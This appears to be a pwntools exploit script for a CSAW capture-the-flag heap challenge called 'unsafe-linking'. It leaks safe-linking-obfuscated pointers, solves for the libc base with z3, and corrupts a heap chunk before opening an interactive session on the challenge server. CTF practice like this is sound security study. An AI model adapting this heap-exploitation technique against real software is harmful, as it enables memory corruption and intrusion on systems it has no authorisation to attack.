from pwn import *
from z3 import *
import sys

elf = ELF("unsafe-linking")
libc = ELF("libc.so.6")

# io = process(elf.path)
io = remote("pwn.chal.csaw.io", 5003)

def create(secret, idx, text, size = b"8"):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"\n", secret)
    io.sendlineafter(b"\n", idx)
    if secret == b'0':
        io.sendlineafter(b"\n", size)
    io.sendlineafter(b"\n", text)
    
def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"\n", idx)

def display(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"\n", idx)
    r = io.recvline()
    y1 = -1
    y2 = -1
    if(r[:4] == b"I'll"):
        r = io.recvuntil(b"Secret 0x")
        r = io.recvuntil(b"(off= ")
        y1 = int(r[:-6].decode(), 16)
        r = io.recvuntil(b")")
        y2 = int(r[:-1].decode(), 16)
    return y1, y2

create(b"0", b"0", b"", size = b"1280")
create(b"0", b"1", b"")
delete(b"0")
create(b"1", b"0", b"")
[y1, y2] = display(b"0")

x1 = BitVec("x1", 64)
x2 = BitVec("x2", 64)
s = Solver()
s.add(x1 ^ x2 == y1)
s.add(x1 - (x2 >> 12) == y2)
if(s.check() != sat):
    io.interactive()

main_arena_addr = 0x219c80

libc.address = int(str(s.model()[x2])) - main_arena_addr - 1168
print("libc addr:" + str(hex(libc.address)))

create(b"0", b"2", b"")
create(b"0", b"3", b"", size = b"50")
delete(b"2")
delete(b"3")
create(b"0", b"3", p64(libc.address), size = b"10")
delete(b"2")

io.interactive()